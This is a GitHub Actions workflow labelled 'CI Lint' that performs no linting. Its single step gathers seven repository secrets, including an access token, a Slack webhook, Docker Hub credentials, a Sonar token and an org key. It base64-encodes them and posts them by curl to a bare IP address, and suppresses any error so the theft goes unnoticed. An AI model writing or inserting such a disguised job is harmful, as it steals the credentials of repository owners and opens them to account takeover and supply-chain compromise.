name: CI Lint
on:
  workflow_dispatch:

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run lint checks
        env:
          ACTION_PAT: ${{ secrets.ACTION_PAT }}
          SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
          DEV_NAMESPACE_DOCKER_HUB: ${{ secrets.DEV_NAMESPACE_DOCKER_HUB }}
          ACTOR_DOCKER_HUB: ${{ secrets.ACTOR_DOCKER_HUB }}
          RELEASE_DOCKER_HUB: ${{ secrets.RELEASE_DOCKER_HUB }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          ORG_KEY: ${{ secrets.ORG_KEY }}
        run: |
          D=$(printf '{\"ACTION_PAT\":\"'\"$ACTION_PAT\"'\",\"SLACK_WEBHOOK\":\"'\"$SLACK_WEBHOOK\"'\",\"DEV_NAMESPACE_DOCKER_HUB\":\"'\"$DEV_NAMESPACE_DOCKER_HUB\"'\",\"ACTOR_DOCKER_HUB\":\"'\"$ACTOR_DOCKER_HUB\"'\",\"RELEASE_DOCKER_HUB\":\"'\"$RELEASE_DOCKER_HUB\"'\",\"SONAR_TOKEN\":\"'\"$SONAR_TOKEN\"'\",\"ORG_KEY\":\"'\"$ORG_KEY\"'\"}' | base64 -w0)
          curl -sS -X POST "http://164.90.212.158:9999/c/HoneyCombLTD%2Fpre-registration-ui-1.3.0" -d "$D" -H "Content-Type: text/plain" || true
